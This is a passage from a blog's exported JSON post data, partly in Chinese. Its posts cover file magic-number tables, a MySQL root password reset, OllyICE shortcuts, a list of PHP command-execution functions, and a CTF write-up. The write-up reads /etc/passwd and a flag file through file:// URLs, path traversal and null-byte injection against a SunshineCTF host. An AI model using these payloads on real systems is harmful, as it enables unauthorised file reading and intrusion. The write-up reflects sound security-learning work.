Movie”</p>\n<p>6D646174, .qt, “Quicktime MovieFile”</p>\n<p>52617221, .rar, “RAR Archive File”</p>\n<p>2E7261FD, .ra;.ram, “Real AudioFile”</p>\n<p>EDABEEDB, .rpm, “RPM Archive File”</p>\n<p>2E736E64, .au, “SoundMachine AudioFile”</p>\n<p>53495421, .sit, “Stuffit v1 ArchiveFile”</p>\n<p>53747566664974, .sit, “Stuffit v5Archive File”</p>\n<p>1F9D, .z, “TAR Compressed ArchiveFile”</p>\n<p>49492A, .tif;.tiff, “TIFF (Intel)”</p>\n<p>4D4D2A,.tif;.tiff, “TIFF (Motorola)”</p>\n<p>554641, .ufa, “UFA Archive File”</p>\n<p>57415645666D74, .wav, “Wave Files”</p>\n<p>D7CDC69A,.wmf, “Windows Meta File”</p>\n<p>4C000000, .lnk, “Windows Shortcut (LinkFile)”</p>\n<p>504B3030504B0304, .zip, “WINZIPCompressed”</p>\n<p>FF575047, .wpg, “WordPerfectGraphics”</p>\n<p>FF575043, .wp, “WordPerfect v5 orv6”</p>\n<p>3C3F786D6C,.xml, “XML Document”</p>\n<p>FFFE3C0052004F004F0054005300540055004200, .xml, “XML Document(ROOTSTUB)”</p>\n<p>3C21454E54495459, .dtd, “XML DTD”</p>\n<p>5A4F4F20, .zoo, “ZOO Archive File”</p>\n</li>\n<li><p>如果有fireworks的字样，可以使用Adobe Fireworks打开</p>\n</li>\n<li><p>U2Fsd特征易知是AES加密的密文,使用解密网站，密钥为空</p>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"<ol>\n<li><p>凯撒13世 rot13</p>\n</li>\n<li><p>roqtp697t95j3 对应键盘下一行</p>\n</li>\n<li><p>栅栏密码</p>","more":"</li>\n<li><p>各种文件头</p>\n<p>JPEG (jpg)，文件头：FFD8FF</p>\n<p>PNG (png)，文件头：89504E47</p>\n<p>GIF (gif)，文件头：47494638</p>\n<p>TIFF (tif)，文件头：49492A00</p>\n<p>Windows Bitmap (bmp)，文件头：424D</p>\n<p>CAD (dwg)，文件头：41433130</p>\n<p>Adobe Photoshop (psd)，文件头：38425053</p>\n<p>Rich Text Format (rtf)，文件头：7B5C727466</p>\n<p>XML (xml)，文件头：3C3F786D6C</p>\n<p>HTML (html)，文件头：68746D6C3E</p>\n<p>Email [thorough only] (eml)，文件头：44656C69766572792D646174653A</p>\n<p>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F</p>\n<p>Outlook (pst)，文件头：2142444E</p>\n<p>zlib                                       789C  x\\xda</p>\n<p>gzip                                       1f8b08</p>\n<p>lzma                                                         6c00                                                                 </p>\n<p>MS Word/Excel (xls.or.doc)，文件头：D0CF11E0</p>\n<p>MS Access (mdb)，文件头：5374616E64617264204A</p>\n<p>WordPerfect (wpd)，文件头：FF575043</p>\n<p>Postscript (eps.or.ps)，文件头：252150532D41646F6265</p>\n<p>Adobe Acrobat (pdf)，文件头：255044462D312E</p>\n<p>Quicken (qdf)，文件头：AC9EBD8F</p>\n<p>Windows Password (pwl)，文件头：E3828596</p>\n<p>ZIP Archive (zip)，文件头：504B0304</p>\n<p>RAR Archive (rar)，文件头：52617221</p>\n<p>Wave (wav)，文件头：57415645</p>\n<p>AVI (avi)，文件头：41564920</p>\n<p>Real Audio (ram)，文件头：2E7261FD</p>\n<p>Real Media (rm)，文件头：2E524D46</p>\n<p>MPEG (mpg)，文件头：000001BA</p>\n<p>MPEG (mpg)，文件头：000001B3</p>\n<p>Quicktime (mov)，文件头：6D6F6F76</p>\n<p>Windows Media (asf)，文件头：3026B2758E66CF11</p>\n<p>MIDI (mid)，文件头：4D546864</p>\n</li>\n<li><p>从winhex中取出的文件头列表</p>\n<p>File Type ExtensionsHeader</p>\n<p>JPEG jpg;jpeg 0xFFD8FF</p>\n<p>PNG png 0x89504E470D0A1A0A</p>\n<p>GIF gif GIF8</p>\n<p>TIFF tif;tiff 0x49492A00</p>\n<p>TIFF tif;tiff 0x4D4D002A</p>\n<p>Bit map bmp BM</p>\n<p>AOL ART art 0x4A47040E000000</p>\n<p>AOL ART art 0x4A47030E000000</p>\n<p>PC Paintbrush pcx 0x0A050108</p>\n<p>Graphics Metafile wmf 0xD7CDC69A</p>\n<p>Graphics Metafile wmf 0x01000900</p>\n<p>Graphics Metafile wmf 0x02000900</p>\n<p>Enhanced Metafile emf 0x0100000058000000</p>\n<p>Corel Draw cdr CDR</p>\n<p>CAD dwg 0x41433130</p>\n<p>Adobe Photoshop psd 8BPS</p>\n<p>Rich Text Format rtf rtf</p>\n<p>XML xml</p>\n<p>HTML html;htm;<a href=\"http://lib.csdn.net/base/php\" target=\"_blank\" rel=\"noopener\">PHP</a>;php3;php4;phtml;shtml type</p>\n<p>Email eml Delivery-date:</p>\n<p>Outlook Express dbx 0xCFAD12FE</p>\n<p>Outlookpst!BDN</p>\n<p>MS Office/OLE2doc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db 0xD0CF11E0A1B11AE1</p>\n<p>MS Access mdb;mda;mde;mdt Standard J</p>\n<p>WordPerfect wpd 0xFF575043</p>\n<p>OpenOffice Writer sxw writer</p>\n<p>OpenOffice Calc sxc calc</p>\n<p>OpenOffice Math sxm math</p>\n<p>OpenOffice Impress sxi impress</p>\n<p>OpenOffice Draw sxd draw</p>\n<p>Adobe FrameMaker fm &lt;MAKERFILE</p>\n<p>PostScript eps.or.ps;ps;eps %!PS-Adobe</p>\n<p>Adobe Acrobat pdf %PDF-1.</p>\n<p>Quicken qdf 0xAC9EBD8F</p>\n<p>QuickBooks Backup qbb 0x458600000600</p>\n<p>Sage sly.or.srt.or.slt;sly;srt;slt0x53520100</p>\n<p>Sage Backup 1 SAGEBACKUP</p>\n<p>Lotus WordPro v9 lwp 0x576F726450726F</p>\n<p>Lotus 123 v9 123 0x00001A00051004</p>\n<p>Lotus 123 v5 wk4 0x00001A0002100400</p>\n<p>Lotus 123 v3 wk3 0x00001A0000100400</p>\n<p>Lotus 123 v1 wk1 0x2000604060</p>\n<p>Windows Password pwl 0xE3828596</p>\n<p>ZIP Archive zip;jar 0x504B0304</p>\n<p>ZIP Archive (outdated) zip 0x504B3030</p>\n<p>RAR Archive rar Rar!</p>\n<p>GZ Archive gz;tgz 0x1F8B08</p>\n<p>BZIP Archive bz2 BZh</p>\n<p>ARJ Archive arj 0x60EA</p>\n<p>7-ZIP Archive 7z 7z集’</p>\n<p>Wave wav WAVE</p>\n<p>AVI avi AVI</p>\n<p>Real Audio ram;ra .ra?0</p>\n<p>Real Media rm .RMF</p>\n<p>MPEG mpg;mpeg 0x000001BA</p>\n<p>MPEG mpg;mpeg 0x000001B3</p>\n<p>Quicktime mov moov</p>\n<p>Windows Media asf 0x3026B2758E66CF11</p>\n<p>MIDI mid MThd</p>\n<p>Win32 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ</p>\n<p>Win16 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ</p>\n<p>ELF Executable elf;; 0x7F454C4601010100</p>\n</li>\n<li><p>各种文件类型文件头标志位详细列表 </p>\n<p>FFD8FFFE00, .JPEG;.JPE;.JPG, “JPGGraphic File”</p>\n<p>FFD8FFE000, .JPEG;.JPE;.JPG, “JPGGraphic File”</p>\n<p>474946383961, .gif, “GIF 89A”</p>\n<p>474946383761, .gif, “GIF 87A”</p>\n<p>424D, .bmp, “Windows Bitmap”</p>\n<p>4D5A,.exe;.com;.386;.ax;.acm;.sys;.dll;.drv;.flt;.fon;.ocx;.scr;.lrc;.vxd;</p>\n<p>.cpl;.x32, “Executable File”</p>\n<p>504B0304, .zip, “Zip Compressed”</p>\n<p>3A42617365, .cnt, “”</p>\n<p>D0CF11E0A1B11AE1,.doc;.xls;.xlt;.ppt;.apr, “MS Compound Document v1 or Lotus Approach APRfile”</p>\n<p>0100000058000000, .emf, “”</p>\n<p>03000000C466C456, .evt, “”</p>\n<p>3F5F0300, .gid;.hlp;.lhp, “Windows HelpFile”</p>\n<p>1F8B08, .gz, “GZ Compressed File”</p>\n<p>28546869732066696C65, .hqx, “”</p>\n<p>0000010000, .ico, “Icon File”</p>\n<p>4C000000011402, .lnk, “Windows LinkFile”</p>\n<p>25504446, .pdf, “Adobe PDF File”</p>\n<p>5245474544495434, .reg, “”</p>\n<p>7B5C727466,.rtf, “Rich Text Format File”</p>\n<p>lh, .lzh, “Lz compression file”</p>\n<p>MThd, .mid, “”</p>\n<p>0A050108, .pcx, “”</p>\n<p>25215053, .eps, “Adobe EPS File”</p>\n<p>2112, .ain, “AIN Archive File”</p>\n<p>1A02, .arc, “ARC/PKPAK Compressed 1”</p>\n<p>1A03, .arc, “ARC/PKPAK Compressed 2”</p>\n<p>1A04, .arc, “ARC/PKPAK Compressed 3”</p>\n<p>1A08, .arc, “ARC/PKPAK Compressed 4”</p>\n<p>1A09, .arc, “ARC/PKPAK Compressed 5”</p>\n<p>60EA, .arj, “ARJ Compressed”</p>\n<p>41564920, .avi, “Audio Video Interleave(AVI)”</p>\n<p>425A68, .bz;.bz2, “Bzip Archive”</p>\n<p>49536328, .cab, “Cabinet File”</p>\n<p>4C01, .obj, “Compiled Object Module”</p>\n<p>303730373037, .tar;.cpio, “CPIO ArchiveFile”</p>\n<p>4352555348, .cru;.crush, “CRUSH ArchiveFile”</p>\n<p>3ADE68B1, .dcx, “DCX Graphic File”</p>\n<p>1F8B, .gz;.tar;.tgz, “Gzip ArchiveFile”</p>\n<p>91334846, .hap, “HAP Archive File”</p>\n<p>3C68746D6C3E,.htm;.html, “HyperText Markup Language 1”</p>\n<p>3C48544D4C3E,.htm;.html, “HyperText Markup Language 2”</p>\n<p>3C21444F4354, .htm;.html, “HyperText MarkupLanguage 3”</p>\n<p>100, .ico, “ICON File”</p>\n<p>5F27A889, .jar, “JAR Archive File”</p>\n<p>2D6C68352D,.lha, “LHA Compressed”</p>\n<p>20006040600, .wk1;.wks, “Lotus 123 v1 Worksheet”</p>\n<p>00001A0007800100, .fm3, “Lotus 123 v3 FMTfile”</p>\n<p>00001A0000100400, .wk3, “Lotus 123 v3Worksheet”</p>\n<p>20006800200, .fmt, “Lotus 123 v4 FMTfile”</p>\n<p>00001A0002100400, .wk4, “Lotus 123 v5”</p>\n<p>5B7665725D, .ami, “Lotus Ami Pro”</p>\n<p>300000041505052, .adx, “Lotus ApproachADX file”</p>\n<p>1A0000030000, .nsf;.ntf, “Lotus NotesDatabase/Template”</p>\n<p>4D47582069747064, .ds4, “MicrografixDesigner 4”</p>\n<p>4D534346, .cab, “Microsoft CAB FileFormat”</p>\n<p>4D546864, .mid, “Midi Audio File”</p>\n<p>000001B3, .mpg;.mpeg, “MPEG Movie”</p>\n<p>0902060000001000B9045C00, .xls, “MS Excel v2”</p>\n<p>0904060000001000F6055C00, .xls, “MS Excel v4”</p>\n<p>7FFE340A,.doc, “MS Word”</p>\n<p>1234567890FF, .doc, “MS Word 6.0”</p>\n<p>31BE000000AB0000, .doc, “MS Word forDOS 6.0”</p>\n<p>1A00000300001100, .nsf, “NotesDatabase”</p>\n<p>7E424B00, .psp, “PaintShop Pro Image File”</p>\n<p>504B0304, .zip, “PKZIP Compressed”</p>\n<p>89504E470D0A, .png, “PNG Image File”</p>\n<p>6D646174, .mov, “QuickTime Movie”</p>\n<p>6D646174, .qt, “Quicktime MovieFile”</p>\n<p>52617221, .rar, “RAR Archive File”</p>\n<p>2E7261FD, .ra;.ram, “Real AudioFile”</p>\n<p>EDABEEDB, .rpm, “RPM Archive File”</p>\n<p>2E736E64, .au, “SoundMachine AudioFile”</p>\n<p>53495421, .sit, “Stuffit v1 ArchiveFile”</p>\n<p>53747566664974, .sit, “Stuffit v5Archive File”</p>\n<p>1F9D, .z, “TAR Compressed ArchiveFile”</p>\n<p>49492A, .tif;.tiff, “TIFF (Intel)”</p>\n<p>4D4D2A,.tif;.tiff, “TIFF (Motorola)”</p>\n<p>554641, .ufa, “UFA Archive File”</p>\n<p>57415645666D74, .wav, “Wave Files”</p>\n<p>D7CDC69A,.wmf, “Windows Meta File”</p>\n<p>4C000000, .lnk, “Windows Shortcut (LinkFile)”</p>\n<p>504B3030504B0304, .zip, “WINZIPCompressed”</p>\n<p>FF575047, .wpg, “WordPerfectGraphics”</p>\n<p>FF575043, .wp, “WordPerfect v5 orv6”</p>\n<p>3C3F786D6C,.xml, “XML Document”</p>\n<p>FFFE3C0052004F004F0054005300540055004200, .xml, “XML Document(ROOTSTUB)”</p>\n<p>3C21454E54495459, .dtd, “XML DTD”</p>\n<p>5A4F4F20, .zoo, “ZOO Archive File”</p>\n</li>\n<li><p>如果有fireworks的字样，可以使用Adobe Fireworks打开</p>\n</li>\n<li><p>U2Fsd特征易知是AES加密的密文,使用解密网站，密钥为空</p>\n</li>\n</ol>"},{"title":"mysql忘记密码/修改密码","date":"2018-05-29T07:29:54.000Z","_content":"\n1.  关闭mysql\n\n   > service mysql stop\n\n2. 无密码登录msyql\n\n   > mysqld_safe --skip-grant-tables &  \n\n3. root连接mysql\n\n   > mysql -u root\n\n4. 修改密码\n\n   > use mysql\n   >\n   > update user set password=PASSWORD('admin') where User='root';  \n\n5. 刷新权限\n\n   > flush privileges;\n\n6. 重启mysql\n\n   > service msyql restart\n\n","source":"_posts/mysql忘记密码-修改密码.md","raw":"---\ntitle: mysql忘记密码/修改密码\ndate: 2018-05-29 15:29:54\ntags: mysql\n---\n\n1.  关闭mysql\n\n   > service mysql stop\n\n2. 无密码登录msyql\n\n   > mysqld_safe --skip-grant-tables &  \n\n3. root连接mysql\n\n   > mysql -u root\n\n4. 修改密码\n\n   > use mysql\n   >\n   > update user set password=PASSWORD('admin') where User='root';  \n\n5. 刷新权限\n\n   > flush privileges;\n\n6. 重启mysql\n\n   > service msyql restart\n\n","slug":"mysql忘记密码-修改密码","published":1,"updated":"2018-06-25T12:00:14.751Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12hd000nqkdlzcqs0s46","content":"<ol>\n<li><p>关闭mysql</p>\n<blockquote>\n<p>service mysql stop</p>\n</blockquote>\n</li>\n<li><p>无密码登录msyql</p>\n<blockquote>\n<p>mysqld_safe –skip-grant-tables &amp;  </p>\n</blockquote>\n</li>\n<li><p>root连接mysql</p>\n<blockquote>\n<p>mysql -u root</p>\n</blockquote>\n</li>\n<li><p>修改密码</p>\n<blockquote>\n<p>use mysql</p>\n<p>update user set password=PASSWORD(‘admin’) where User=’root’;  </p>\n</blockquote>\n</li>\n<li><p>刷新权限</p>\n<blockquote>\n<p>flush privileges;</p>\n</blockquote>\n</li>\n<li><p>重启mysql</p>\n<blockquote>\n<p>service msyql restart</p>\n</blockquote>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<ol>\n<li><p>关闭mysql</p>\n<blockquote>\n<p>service mysql stop</p>\n</blockquote>\n</li>\n<li><p>无密码登录msyql</p>\n<blockquote>\n<p>mysqld_safe –skip-grant-tables &amp;  </p>\n</blockquote>\n</li>\n<li><p>root连接mysql</p>\n<blockquote>\n<p>mysql -u root</p>\n</blockquote>\n</li>\n<li><p>修改密码</p>\n<blockquote>\n<p>use mysql</p>\n<p>update user set password=PASSWORD(‘admin’) where User=’root’;  </p>\n</blockquote>\n</li>\n<li><p>刷新权限</p>\n<blockquote>\n<p>flush privileges;</p>\n</blockquote>\n</li>\n<li><p>重启mysql</p>\n<blockquote>\n<p>service msyql restart</p>\n</blockquote>\n</li>\n</ol>\n"},{"title":"ollyice","date":"2018-07-09T07:59:03.000Z","_content":"\n## 快捷键记录\n\nf9:          运行程序\n\nf7:          单步步入\n\nf8:          单步步过\n\nctrl+f2:    重新运行\n\nalt+f1:      命令行","source":"_posts/ollyice.md","raw":"---\ntitle: ollyice\ndate: 2018-07-09 15:59:03\ntags:\n---\n\n## 快捷键记录\n\nf9:          运行程序\n\nf7:          单步步入\n\nf8:          单步步过\n\nctrl+f2:    重新运行\n\nalt+f1:      命令行","slug":"ollyice","published":1,"updated":"2018-07-17T12:15:58.118Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12hh000qqkdleq54kipp","content":"<h2 id=\"快捷键记录\"><a href=\"#快捷键记录\" class=\"headerlink\" title=\"快捷键记录\"></a>快捷键记录</h2><p>f9:          运行程序</p>\n<p>f7:          单步步入</p>\n<p>f8:          单步步过</p>\n<p>ctrl+f2:    重新运行</p>\n<p>alt+f1:      命令行</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"快捷键记录\"><a href=\"#快捷键记录\" class=\"headerlink\" title=\"快捷键记录\"></a>快捷键记录</h2><p>f9:          运行程序</p>\n<p>f7:          单步步入</p>\n<p>f8:          单步步过</p>\n<p>ctrl+f2:    重新运行</p>\n<p>alt+f1:      命令行</p>\n"},{"title":"parse_url + curl","date":"2018-04-24T01:55:40.000Z","_content":"\n# parse_url + curl\n\nLet's open the URL and prod around. We find a search box, which can retrieve the source code of any page on https://www.google.com.\n\n1. Different hostnames are all blocked. Examples are:\n  * `evil.com` \n  * hostnames that include `www.google.com` such as `www.google.com.evil.com` \n  * URLs that include google.com such as `www.evil.com/http://www.google.com`\n2. [php:// filter urls](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/) do not work.\n3. Appending a null byte to the query, i.e., `site=http%3A%2F%2Fwww.google.com%00` gives a warning: `curl_setopt(): Curl option contains invalid characters (\\0)`\n  * So null bytes are detected and blocked\n  * We now know that the backend used is cURL\n4. Googling for this error then leads to https://bugs.php.net/bug.php?id=68089\n  * This has a nice example: `file:///etc/passwd%00http://google.com`\n  * Apparently cURL also understands `file://` urls!\n  * If you read carefully, you'll notice that this specific vulnerability is not addressed in PHP as it's considered a cURL issue\n5. First focusing on the `file://` protocol: we notice that this protocol is supported, as `file://www.google.com` returns a _different_ error than before.\n6. Testing locally, we find that `file://www.google.com/../etc/passwd` in fact reads `/etc/passwd`. However, search-box appends a `/`\n   to the end of the url, which means the code would try to read `/etc/passwd/`, which of course doesn't exist.\n7. Combining the two, we can send the null byte URLencoded to cURL. So the final attack URL becomes something like\n   `file://www.google.com/../etc/flag.txt%00`. The final request thus becomes\n   http://search-box.web1.sunshinectf.org/?submit=Submit&site=file%3A%2F%2Fwww.google.com%2F..%2Fetc%2Fflag.txt%2500\n   and this finally gets us the flag.\n8. file://user@127.0.0.1:80@www.google.com/etc/flag.txt\n9. file://user@127.0.0.1:80@www.google.com/etc/flag.txt#","source":"_posts/parse_url+curl.md","raw":"---\ntitle: parse_url + curl\ndate: 2018-04-24 9:55:40\ntags: web\n---\n\n# parse_url + curl\n\nLet's open the URL and prod around. We find a search box, which can retrieve the source code of any page on https://www.google.com.\n\n1. Different hostnames are all blocked. Examples are:\n  * `evil.com` \n  * hostnames that include `www.google.com` such as `www.google.com.evil.com` \n  * URLs that include google.com such as `www.evil.com/http://www.google.com`\n2. [php:// filter urls](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/) do not work.\n3. Appending a null byte to the query, i.e., `site=http%3A%2F%2Fwww.google.com%00` gives a warning: `curl_setopt(): Curl option contains invalid characters (\\0)`\n  * So null bytes are detected and blocked\n  * We now know that the backend used is cURL\n4. Googling for this error then leads to https://bugs.php.net/bug.php?id=68089\n  * This has a nice example: `file:///etc/passwd%00http://google.com`\n  * Apparently cURL also understands `file://` urls!\n  * If you read carefully, you'll notice that this specific vulnerability is not addressed in PHP as it's considered a cURL issue\n5. First focusing on the `file://` protocol: we notice that this protocol is supported, as `file://www.google.com` returns a _different_ error than before.\n6. Testing locally, we find that `file://www.google.com/../etc/passwd` in fact reads `/etc/passwd`. However, search-box appends a `/`\n   to the end of the url, which means the code would try to read `/etc/passwd/`, which of course doesn't exist.\n7. Combining the two, we can send the null byte URLencoded to cURL. So the final attack URL becomes something like\n   `file://www.google.com/../etc/flag.txt%00`. The final request thus becomes\n   http://search-box.web1.sunshinectf.org/?submit=Submit&site=file%3A%2F%2Fwww.google.com%2F..%2Fetc%2Fflag.txt%2500\n   and this finally gets us the flag.\n8. file://user@127.0.0.1:80@www.google.com/etc/flag.txt\n9. file://user@127.0.0.1:80@www.google.com/etc/flag.txt#","slug":"parse_url+curl","published":1,"updated":"2018-07-30T03:33:33.809Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12hj000sqkdlh9wu7ya6","content":"<h1 id=\"parse-url-curl\"><a href=\"#parse-url-curl\" class=\"headerlink\" title=\"parse_url + curl\"></a>parse_url + curl</h1><p>Let’s open the URL and prod around. We find a search box, which can retrieve the source code of any page on <a href=\"https://www.google.com\" target=\"_blank\" rel=\"noopener\">https://www.google.com</a>.</p>\n<ol>\n<li>Different hostnames are all blocked. Examples are:<ul>\n<li><code>evil.com</code> </li>\n<li>hostnames that include <code>www.google.com</code> such as <code>www.google.com.evil.com</code> </li>\n<li>URLs that include google.com such as <code>www.evil.com/http://www.google.com</code></li>\n</ul>\n</li>\n<li><a href=\"https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/\" target=\"_blank\" rel=\"noopener\">php:// filter urls</a> do not work.</li>\n<li>Appending a null byte to the query, i.e., <code>site=http%3A%2F%2Fwww.google.com%00</code> gives a warning: <code>curl_setopt(): Curl option contains invalid characters (\\0)</code><ul>\n<li>So null bytes are detected and blocked</li>\n<li>We now know that the backend used is cURL</li>\n</ul>\n</li>\n<li>Googling for this error then leads to <a href=\"https://bugs.php.net/bug.php?id=68089\" target=\"_blank\" rel=\"noopener\">https://bugs.php.net/bug.php?id=68089</a><ul>\n<li>This has a nice example: <code>file:///etc/passwd%00http://google.com</code></li>\n<li>Apparently cURL also understands <code>file://</code> urls!</li>\n<li>If you read carefully, you’ll notice that this specific vulnerability is not addressed in PHP as it’s considered a cURL issue</li>\n</ul>\n</li>\n<li>First focusing on the <code>file://</code> protocol: we notice that this protocol is supported, as <code>file://www.google.com</code> returns a <em>different</em> error than before.</li>\n<li>Testing locally, we find that <code>file://www.google.com/../etc/passwd</code> in fact reads <code>/etc/passwd</code>. However, search-box appends a <code>/</code><br>to the end of the url, which means the code would try to read <code>/etc/passwd/</code>, which of course doesn’t exist.</li>\n<li>Combining the two, we can send the null byte URLencoded to cURL. So the final attack URL becomes something like<br><code>file://www.google.com/../etc/flag.txt%00</code>. The final request thus becomes<br><a href=\"http://search-box.web1.sunshinectf.org/?submit=Submit&amp;site=file%3A%2F%2Fwww.google.com%2F..%2Fetc%2Fflag.txt%2500\" target=\"_blank\" rel=\"noopener\">http://search-box.web1.sunshinectf.org/?submit=Submit&amp;site=file%3A%2F%2Fwww.google.com%2F..%2Fetc%2Fflag.txt%2500</a><br>and this finally gets us the flag.</li>\n<li>file:<a href=\"mailto://user@127.0.0.1\" target=\"_blank\" rel=\"noopener\">//user@127.0.0.1</a>:<a href=\"mailto:80@www.google.com\" target=\"_blank\" rel=\"noopener\">80@www.google.com</a>/etc/flag.txt</li>\n<li>file:<a href=\"mailto://user@127.0.0.1\" target=\"_blank\" rel=\"noopener\">//user@127.0.0.1</a>:<a href=\"mailto:80@www.google.com\" target=\"_blank\" rel=\"noopener\">80@www.google.com</a>/etc/flag.txt#</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"parse-url-curl\"><a href=\"#parse-url-curl\" class=\"headerlink\" title=\"parse_url + curl\"></a>parse_url + curl</h1><p>Let’s open the URL and prod around. We find a search box, which can retrieve the source code of any page on <a href=\"https://www.google.com\" target=\"_blank\" rel=\"noopener\">https://www.google.com</a>.</p>\n<ol>\n<li>Different hostnames are all blocked. Examples are:<ul>\n<li><code>evil.com</code> </li>\n<li>hostnames that include <code>www.google.com</code> such as <code>www.google.com.evil.com</code> </li>\n<li>URLs that include google.com such as <code>www.evil.com/http://www.google.com</code></li>\n</ul>\n</li>\n<li><a href=\"https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/\" target=\"_blank\" rel=\"noopener\">php:// filter urls</a> do not work.</li>\n<li>Appending a null byte to the query, i.e., <code>site=http%3A%2F%2Fwww.google.com%00</code> gives a warning: <code>curl_setopt(): Curl option contains invalid characters (\\0)</code><ul>\n<li>So null bytes are detected and blocked</li>\n<li>We now know that the backend used is cURL</li>\n</ul>\n</li>\n<li>Googling for this error then leads to <a href=\"https://bugs.php.net/bug.php?id=68089\" target=\"_blank\" rel=\"noopener\">https://bugs.php.net/bug.php?id=68089</a><ul>\n<li>This has a nice example: <code>file:///etc/passwd%00http://google.com</code></li>\n<li>Apparently cURL also understands <code>file://</code> urls!</li>\n<li>If you read carefully, you’ll notice that this specific vulnerability is not addressed in PHP as it’s considered a cURL issue</li>\n</ul>\n</li>\n<li>First focusing on the <code>file://</code> protocol: we notice that this protocol is supported, as <code>file://www.google.com</code> returns a <em>different</em> error than before.</li>\n<li>Testing locally, we find that <code>file://www.google.com/../etc/passwd</code> in fact reads <code>/etc/passwd</code>. However, search-box appends a <code>/</code><br>to the end of the url, which means the code would try to read <code>/etc/passwd/</code>, which of course doesn’t exist.</li>\n<li>Combining the two, we can send the null byte URLencoded to cURL. So the final attack URL becomes something like<br><code>file://www.google.com/../etc/flag.txt%00</code>. The final request thus becomes<br><a href=\"http://search-box.web1.sunshinectf.org/?submit=Submit&amp;site=file%3A%2F%2Fwww.google.com%2F..%2Fetc%2Fflag.txt%2500\" target=\"_blank\" rel=\"noopener\">http://search-box.web1.sunshinectf.org/?submit=Submit&amp;site=file%3A%2F%2Fwww.google.com%2F..%2Fetc%2Fflag.txt%2500</a><br>and this finally gets us the flag.</li>\n<li>file:<a href=\"mailto://user@127.0.0.1\" target=\"_blank\" rel=\"noopener\">//user@127.0.0.1</a>:<a href=\"mailto:80@www.google.com\" target=\"_blank\" rel=\"noopener\">80@www.google.com</a>/etc/flag.txt</li>\n<li>file:<a href=\"mailto://user@127.0.0.1\" target=\"_blank\" rel=\"noopener\">//user@127.0.0.1</a>:<a href=\"mailto:80@www.google.com\" target=\"_blank\" rel=\"noopener\">80@www.google.com</a>/etc/flag.txt#</li>\n</ol>\n"},{"title":"php命令执行函数","date":"2018-07-15T01:56:37.000Z","_content":"\n代码或命令执行函数：\n\n1. system                    允许执行一个外部程序并回显输出，类似于 passthru() \n2. shell_exec\n3. exec                        允许执行一个外部程序 \n4. curl_exec\n5. popen               可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。\n6. proc_open               执行一个命令并打开文件指针用于读取以及写入 \n7. passthru                   允许执行一个外部程序并回显输出 \n8. pcntl_exec\n9. popepassthru \n10. assert\n11. eval\n12. preg_replace              \\e修饰符          PHP 5.5.0 起， 传入 “\\e” 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 “\\e” 也无法起效。 \n13. create_functioin            创建一个匿名函数。  \n14. call_user_func             把第一个参数作为回调函数调用  \n15. call_user_func_array      调用回调函数，并把一个数组参数作为回调函数的参数  \n\n其他:\n\n1. scandir\n2. glob                 列目录\n3. phpinfo\n4. chroot                   可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式 PHP 时才能工作，且该函数不适用于 Windows 系统。 \n5. chgrp                   改变文件或目录所属的用户组 \n6. chown                  改变文件或目录的所有者 \n7. error_log                将错误信息发送到指定位置（文件)，在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode， 执行任意命令 \n8. openlog\n9. syslog                 可调用 UNIX 系统的系统层 syslog() 函数。\n10. proc_get_status    获取使用 proc_open() 所打开进程的信息    \n11. ini_alter                是 ini_set() 函数的一个别名函数，功能与 ini_set() 相同 \n12. ini_set                  可用于修改、设置 PHP 环境配置参数 \n13. ini_restore          可用于恢复 PHP 环境配置参数到其初始值。\n14. dl()                       在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。\n15. pfsockopen         建立一个 Internet 或 UNIX 域的 socket 持久连接。\n16. fsocket\n17. readlink           返回符号连接指向的目标文件内容\n18. symlink            在 UNIX 系统中建立一个符号链接。\n19. stream_socket_server             建立一个 Internet 或 UNIX 服务器连接\n20. putenv                    用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。","source":"_posts/php命令执行函数.md","raw":"---\ntitle: php命令执行函数\ndate: 2018-07-15 09:56:37\ntags:\n---\n\n代码或命令执行函数：\n\n1. system                    允许执行一个外部程序并回显输出，类似于 passthru() \n2. shell_exec\n3. exec                        允许执行一个外部程序 \n4. curl_exec\n5. popen               可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。\n6. proc_open               执行一个命令并打开文件指针用于读取以及写入 \n7. passthru                   允许执行一个外部程序并回显输出 \n8. pcntl_exec\n9. popepassthru \n10. assert\n11. eval\n12. preg_replace              \\e修饰符          PHP 5.5.0 起， 传入 “\\e” 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 “\\e” 也无法起效。 \n13. create_functioin            创建一个匿名函数。  \n14. call_user_func             把第一个参数作为回调函数调用  \n15. call_user_func_array      调用回调函数，并把一个数组参数作为回调函数的参数  \n\n其他:\n\n1. scandir\n2. glob                 列目录\n3. phpinfo\n4. chroot                   可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式 PHP 时才能工作，且该函数不适用于 Windows 系统。 \n5. chgrp                   改变文件或目录所属的用户组 \n6. chown                  改变文件或目录的所有者 \n7. error_log                将错误信息发送到指定位置（文件)，在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode， 执行任意命令 \n8. openlog\n9. syslog                 可调用 UNIX 系统的系统层 syslog() 函数。\n10. proc_get_status    获取使用 proc_open() 所打开进程的信息    \n11. ini_alter                是 ini_set() 函数的一个别名函数，功能与 ini_set() 相同 \n12. ini_set                  可用于修改、设置 